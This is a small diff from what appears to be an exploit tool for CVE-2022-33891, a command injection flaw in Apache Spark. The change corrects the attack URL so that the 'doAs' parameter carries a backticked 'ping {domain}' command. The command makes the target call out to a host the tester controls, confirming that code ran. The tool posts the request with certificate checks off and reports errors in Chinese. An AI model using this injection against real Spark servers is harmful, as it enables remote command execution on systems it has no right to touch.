@@ -13,7 +13,7 @@ def apache_spark_cve_2022_33891_exp(target_url):
     except Exception as err:
         apache_spark_cve_2022_33891_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
         apache_spark_cve_2022_33891_text.see(END)
-    targeturl = f'{target_url}/doAs?=`ping {domain}`'
+    targeturl = f'{target_url}/?doAs=`ping {domain}`'
     try:
         res = session.post(url=targeturl, verify=False, timeout=20)
         return res.status_code
